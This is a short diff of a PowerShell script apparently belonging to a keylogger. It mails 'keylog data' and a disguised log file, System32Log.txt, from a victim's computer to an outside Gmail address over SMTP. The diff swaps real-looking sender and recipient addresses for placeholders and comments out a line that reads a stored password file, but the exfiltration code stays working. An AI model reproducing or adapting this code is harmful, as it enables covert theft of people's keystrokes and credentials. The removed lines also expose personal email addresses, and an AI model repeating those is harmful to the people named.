@@ -6,17 +6,17 @@
 $message="keylog data from $env:computername"
 
 if($message -ne $null) {
-	$SendAddress="bright7hat@gmail.com"
+	$SendAddress="sending email"
 	$SMTPServer="smtp.gmail.com"
 	$SMTPPort="587"
 
-	$enc=Get-Content 'C:\Users\Public\pass.txt'
+	#$enc=Get-Content 'C:\Users\Public\pass.txt'
 	$password=ConvertTo-SecureString $env:pass -AsPlainText -Force
 
 	$creds= New-Object System.Management.Automation.PSCredential ($SendAddress,$password) 
 	$user=gwmi -class Win32_ComputerSystem | select username | grep $env:computername | %{ $_.Split('\')[1]; }
 
-	Send-MailMessage -From $SendAddress -to "brytonjherdes@gmail.com" -Subject "Keyscan" `
+	Send-MailMessage -From $SendAddress -to "destination email" -Subject "Keyscan" `
 	-Body " $message" -Attachments "C:\users\public\System32Log.txt" `
 	-SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $creds 
 
